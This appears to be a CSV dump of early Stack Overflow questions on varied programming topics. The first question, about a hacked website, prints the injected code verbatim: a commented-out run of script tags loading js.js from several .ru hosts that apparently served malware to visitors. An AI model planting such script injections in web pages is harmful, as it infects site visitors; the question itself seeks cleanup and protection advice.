Title,Body,Tags
"My website got hacked.. What should I do?","<p>My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.</p>

<p>I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): <a href=""http://www.98hs.ru/js.js"" rel=""noreferrer"">http://www.98hs.ru/js.js</a> &lt;-- <strong>TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.</strong></p>

<p>So I commented it out for now. It turns out his FTP password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).</p>

<p>I did a <a href=""http://whois.domaintools.com/98hs.ru"" rel=""noreferrer"">whois on 98hs.ru</a> and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...</p>

<p>I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?</p>

<p>He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to <em>do</em> sftp on their site. I'm thinking his username and password got intercepted?</p>

<p><strong>So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?</strong></p>

<p>For the record, here is the line of code that ""magically"" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):</p>

<pre><code>&lt;!--script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script--&gt;
</code></pre>
","<security><cracking>"
"Bringing Window to the Front in C# using Win32 API","<p>I am writing an application that needs to bring window of an external app to the foreground, and not necessarily steal focus (there is a setting the user can toggle to steal/not steal focus).</p>

<p>What is the best way to go about this using the win32 API?  I have tried SetForeground() but it always steals focus and does not consistenly work.</p>

<p>What is the best way to go about this? Any thoughts?</p>
","<c#><winapi>"
"What problems can be solved, or tackled more easily, using graphs and trees?","<p>What are the most common problems that can be solved with both these data structures?</p>

<p>It would be good for me to have also recommendations on books that:</p>

<ul>
<li>Implement the structures</li>
<li>Implement and explain the reasoning of the algorithms that use them</li>
</ul>
","<algorithm><data-structures><tree><computer-science><graph-theory>"
"Reverse DNS in Ruby?","<p>I'm in an environment with a lot of computers that haven't been
properly inventoried. Basically, no one knows which IP goes with which
mac address and which hostname. So I wrote the following:</p>

<pre><code># This script goes down the entire IP range and attempts to
# retrieve the Hostname and mac address and outputs them
# into a file. Yay!

require ""socket""

TwoOctets = ""10.26""

def computer_exists?(computerip)
 system(""ping -c 1 -W 1 #{computerip}"")
end

def append_to_file(line)
 file   = File.open(""output.txt"", ""a"")
 file.puts(line)
 file.close
end


def getInfo(current_ip)
 begin
   if computer_exists?(current_ip)
     arp_output = `arp -v #{current_ip}`
     mac_addr = arp_output.to_s.match(/..:..:..:..:..:../)
     host_name = Socket.gethostbyname(current_ip)
     append_to_file(""#{host_name[0]} - #{current_ip} - #{mac_addr}\n"")
   end
 rescue SocketError =&gt; mySocketError
   append_to_file(""unknown - #{current_ip} - #{mac_addr}"")
 end
end


(6..8).each do |i|
 case i
   when 6
     for j in (1..190)
       current_ip = ""#{TwoOctets}.#{i}.#{j}""
       getInfo(current_ip)
     end
   when 7
     for j in (1..255)
       current_ip = ""#{TwoOctets}.#{i}.#{j}""
       getInfo(current_ip)
     end
   when 8
     for j in (1..52)
       current_ip = ""#{TwoOctets}.#{i}.#{j}""
       getInfo(current_ip)
     end
 end
end
</code></pre>

<p>Everything works except it does not find a Reverse DNS.</p>

<p>Sample output that I'm getting is this:</p>

<pre><code>10.26.6.12 - 10.26.6.12 - 00:11:11:9B:13:9F
10.26.6.17 - 10.26.6.17 - 08:00:69:9A:97:C3
10.26.6.18 - 10.26.6.18 - 08:00:69:93:2C:E2
</code></pre>

<p>If I do <code>nslookup 10.26.6.12</code> then I get the correct reverse DNS so
that shows that my machine is seeing the DNS server.</p>

<p>I have tried <code>Socket.gethostbyname</code>, <code>gethostbyaddr</code>, but it doesn't work.</p>

<p>Any guidance will be much appreciated.</p>
","<ruby><sockets><dns><nslookup>"
"Using ASP.NET Dynamic Data / LINQ to SQL, how do you have two table fields have a relationship to the same foreign key?","<p>I am using ASP.NET Dynamic Data for a project and I have a table that has two seperate fields that link to the same foreign key in a different table.</p>

<p>This relationship works fine in SQL Server.</p>

<p>However, in the LINQ to SQL model in the ASP.NET Dynamic Data model, only the first field's relationship is reflected.  If I attempt to add the second relationship manually, it complains that it ""Cannot create an association ""ForeignTable_BaseTable"".  The same property is listed more than once: ""Id"".""</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/bb629292.aspx"" rel=""noreferrer"">This MSDN article</a> gives such helpful advice as:</p>

<ul>
<li>Examine the message and note the property specified in the message.</li>
<li>Click OK to dismiss the message box.</li>
<li>Inspect the Association Properties and remove the duplicate entries.</li>
<li>Click OK.</li>
</ul>
","<asp.net><dynamic-data>"
"How can we generate getters and setters in Visual Studio?","<p>By ""generate"", I mean auto-generation of the code necessary for a particular selected (set of) variable(s).</p>

<p>But any more explicit explication or comment on good practice is welcome.</p>
","<c#><visual-studio><setter><getter>"
"What is recursion and when should I use it?","<p>One of the topics that seems to come up regularly on mailing lists and online discussions is the merits (or lack thereof) of doing a Computer Science Degree. An argument that seems to come up time and again for the negative party is that they have been coding for some number of years and they have never used recursion.</p>

<p>So the question is:</p>

<ol>
<li>What is recursion?</li>
<li>When would I use recursion?</li>
<li>Why don't people use recursion?</li>
</ol>
","<recursion><computer-science>"
"Is there an Unobtrusive Captcha for web forms?","<p>What is the best unobtrusive CAPTCHA for web forms? One that does not involve a UI, rather a non-UI Turing test. I have seen a simple example of a non UI CAPTCHA like the <a href=""http://www.asp.net/AJAX/AjaxControlToolkit/Samples/NoBot/NoBot.aspx"" rel=""noreferrer"">Nobot</a>  control from Microsoft. I am looking for a CAPTCHA that does not ask the user any question in any form. No riddles, no what's in this image.</p>
","<security><usability><captcha>"
"What's the safest way to iterate through the keys of a Perl hash?","<p>If I have a Perl hash with a bunch of (key, value) pairs, what is the preferred method of iterating through all the keys?  I have heard that using <code>each</code> may in some way have unintended side effects.  So, is that true, and is one of the two following methods best, or is there a better way?</p>

<pre><code># Method 1
while (my ($key, $value) = each(%hash)) {
    # Something
}

# Method 2
foreach my $key (keys(%hash)) {
    # Something
}
</code></pre>
","<perl><hash><iteration><each>"
"Linking two Office documents","<p><strong>Problem:</strong> </p>

<p>I have two spreadsheets that each serve different purposes but contain one particular piece of data that needs to be the same in both spreadsheets.  This piece of data (one of the columns) gets updated in spreadsheet A but needs to also be updated in spreadsheet B.</p>

<p><strong>Goal:</strong></p>

<p>A solution that would somehow link these two spreadsheets together (keep in mind that they exist on two separate LAN shares on the network) so that when A is updated, B is automatically updated for the corresponding record.</p>

<p>*Note that I understand fully that a database would probably be a better plan for tasks such as these but unfortunately I have no say in that matter.</p>

<p>**Note also that this needs to work for Office 2003 and Office 2007</p>
","<office-2007><office-2003>"
"How do I configure and communicate with a serial port?","<p>I need to send and receive data over serial connections (RS-232 and RS-422).</p>

<p>How do I set up and communicate with such a connection?  How do I figure out what the configuration settings (e.g. baud rate) should be and how do I set them?</p>

<p>In particular I am looking to do this in Java, C/C++, or one of the major Unix shells but I also have some interest in serial programming using Windows/Hyperterminal.</p>
","<java><c++><windows><unix>"
"Speed Comparisons - Procedural vs. OO in interpreted languages","<p>In interpreted programming languages, such as PHP and JavaScript, what are the repercussions of going with an Object Oriented approach over a Procedural approach?</p>

<p>Specifically what I am looking for is a checklist of things to consider when creating a web application and choosing between Procedural and Object Oriented approaches, to optimize not only for speed, but maintainability as well. Cited research and test cases would be helpful as well if you know of any articles exploring this further.</p>

<p>Bottom line: how big (if any) is the performance hit really, when going with OO vs. Procedural in an interpreted language?</p>
","<performance><oop><maintainability><procedural><interpreted-language>"
"What is Inversion of Control?","<p>Inversion of Control (IoC) can be quite confusing when it is first encountered.</p>

<ol>
<li>What is it?</li>
<li>Which problem does it solve?</li>
<li>When is it appropriate to use and when not?</li>
</ol>
","<oop><design-patterns><inversion-of-control>"
"Calling a function of a module by using its name (a string)","<p>What is the best way to go about calling a function given a string with the function's name in a Python program.  For example, let's say that I have a module <code>foo</code>, and I have a string whose content is <code>""bar""</code>. What is the best way to call <code>foo.bar()</code>?</p>

<p>I need to get the return value of the function, which is why I don't just use <code>eval</code>. I figured out how to do it by using <code>eval</code> to define a temp function that returns the result of that function call, but I'm hoping that there is a more elegant way to do this.</p>
","<python><object>"
"Plugin for Visual Studio to Mimic Eclipse's ""Open Type"" or ""Open Resource"" Keyboard Access","<p>If you've ever used Eclipse, you've probably noticed the great keyboard shortcuts that let you hit a shortcut key combination, then just type the first few characters of a function, class, filename, etc. It's even smart enough to put open files first in the list.</p>

<p><img src=""https://i.stack.imgur.com/aLKhF.png"" alt=""alt text""></p>

<p>I'm looking for a similar functionality for Visual Studio 2008. I know there's a findfiles plugin on codeproject, but that one is buggy and a little weird, and doesn't give me access to functions or classes.</p>
","<visual-studio><plugins>"
